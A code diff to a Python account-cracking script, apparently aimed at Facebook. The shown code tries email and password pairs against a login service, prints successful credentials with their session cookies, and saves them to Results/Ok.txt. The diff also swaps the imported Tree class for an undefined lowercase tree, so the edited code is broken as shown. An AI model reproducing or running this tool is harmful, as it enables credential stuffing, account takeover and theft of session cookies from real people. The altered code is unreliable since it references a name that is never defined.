@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-from tkinter.tix import Tree
-import requests,json,os,sys,random,datetime,time,re,tkinter
+import requests,json,os,sys,random,datetime,time,re
 from concurrent.futures import ThreadPoolExecutor
 from rich.panel import Panel
 from rich import print
@@ -385,7 +384,7 @@ class crack:
                         try:
                             self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                         except:pass
-                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
+                        tree = tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
                         tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
                         tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
                         print(tree)
@@ -393,7 +392,7 @@ class crack:
                         open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                         break
                     elif 'checkpoint' in r.cookies.get_dict().keys():
-                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
+                        tree = tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
                         tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                         tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
                         print(tree)
